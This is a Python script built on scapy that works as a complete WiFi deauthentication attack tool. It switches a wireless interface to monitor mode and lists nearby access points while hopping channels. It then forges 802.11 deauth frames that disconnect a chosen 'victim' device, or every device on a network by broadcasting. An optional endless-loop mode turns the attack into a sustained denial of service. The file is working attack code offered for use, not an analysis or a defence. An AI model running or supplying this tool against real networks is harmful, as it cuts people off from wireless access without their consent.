import signal
import argparse
import subprocess
from scapy.all import sendp, os, random
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon
from scapy.sendrecv import sniff


channel = [1, 6, 11]


def channelHopping(interface):
    r = random.randrange(3)
    os.system('iw dev %s set channel %d' % (interface, channel[r]))


def print_row(len, bbsid, pwr, channel, encrypt, ssid):
    print("%-1s %-25s %-5s %-5s %-15s %-15s" % (len, bbsid, pwr, channel, encrypt, ssid))


bssid = []


def getAllWifiDevices(packet):
    if packet.haslayer(Dot11):
        if packet.addr2 and packet.addr2 not in bssid:
            try:
                stats = packet[Dot11Beacon].network_stats()
                bssid.append(packet.addr2)
                print_row(len(bssid), packet.addr2, packet.dBm_AntSignal, stats.get("channel"), *stats.get("crypto"), packet.info.decode("utf-8"))
                """print(len(bssid), packet.addr2, packet.dBm_AntSignal, stats.get("channel"),
                      *stats.get("crypto"), packet.info.decode("utf-8"))"""
            except:
                pass


def getMacBssid(interface):
    subprocess.run("iwconfig %s" % interface, shell=True, check=True)


def setMonitorMode(interface):
    os.system('nmcli dev disconnect %s' % interface)
    os.system('ifconfig %s down' % interface)
    os.system('iwconfig %s mode monitor' % interface)
    os.system('ifconfig %s up' % interface)


def setManagedMode(interface):
    os.system('ifconfig %s down' % interface)
    os.system('iwconfig %s mode managed' % interface)
    os.system('ifconfig %s up' % interface)


# Sending deauth message
# Prerequisites:
# attacker and victim have wifi.
# attacker have the network interface in monitor mode
def deauth(macVictim, interface, gateway):
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=macVictim, addr2=gateway, addr3=gateway) / Dot11Deauth(reason=2)
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)


def ex():
    print("You can only choose one: -a -g -mt -mg")
    exit(1)


def checkParameters(args):
    if args.getMacBssid:
        if args.getAllBssid:
            ex()
        elif args.monitorMode:
            ex()
        elif args.managedMode:
            ex()
        else:
            try:
                print(getMacBssid())
            except:
                print("You need to be connected to a network!")
    elif args.getAllBssid:
        if args.monitorMode:
            ex()
        elif args.managedMode:
            ex()
        else:
            print_row('', 'BSSID', 'PWR', 'CH', "CRYPT", "SSID")
            newpid = os.fork()
            if newpid == 0:
                sniff(iface=args.interface, prn=getAllWifiDevices)
            else:
                newpid2 = os.fork()
                if newpid2 == 0:
                    while True:
                        channelHopping(args.interface)
                else:
                    input('')
                    os.kill(newpid, signal.SIGKILL)
    elif args.monitorMode:
        if args.managedMode:
            ex()
        else:
            setMonitorMode(args.interface)
    elif args.managedMode:
        setManagedMode(args.interface)
    else:
        if args.victim is None:
            macVictim = "ff:ff:ff:ff:ff:ff"
        else:
            macVictim = args.victim

        if args.bssid is None:
            print("You have to set de the router bssid")
        else:
            if args.dos:
                print("Press enter to kill the program")
                newpid = os.fork()
                if newpid == 0:
                    while True:
                        deauth(macVictim, args.interface, args.bssid)
                else:
                    input('')
                    os.kill(newpid, signal.SIGKILL)
            else:
                deauth(macVictim, args.interface, args.bssid)


if __name__ == "__main__":
    macVictim = ""
    parser = argparse.ArgumentParser(
        description="This script deauthenticates a device from a router. It can be used to with all devices (ff:ff:ff:ff:ff:ff).\n"
                    "Prerequisites: You and your victim need to have wifi. ")
    ######################################################################################################################
    parser.add_argument("-v", "--victim", required=False,
                        help="Victim MAC address. Default ff:ff:ff:ff:ff:ff (send to broadcast, it will affect all devices connected by wifi)")  # default ff:ff:ff:ff:ff:ff
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-b", "--bssid", required=False, help="Gateway MAC address")
    parser.add_argument("-d", "--dos", required=False, action="store_true", help="This option put de deauthentication function in an endless loop")
    #####################################################################################################
    parser.add_argument("-g", "--getMacBssid", required=False, action='store_true',
                        help="This options get the MAC of the router you are connected to and more information about it")
    parser.add_argument("-a", "--getAllBssid", required=False, action='store_true',
                        help="This options get all mac of the nearby routers")
    parser.add_argument("-mt", "--monitorMode", required=False, action='store_true',
                        help="This option put your interface in monitor mode")
    parser.add_argument("-mg", "--managedMode", required=False, action='store_true',
                        help="This option put your interface in managed mode")
    args = parser.parse_args()

    checkParameters(args)
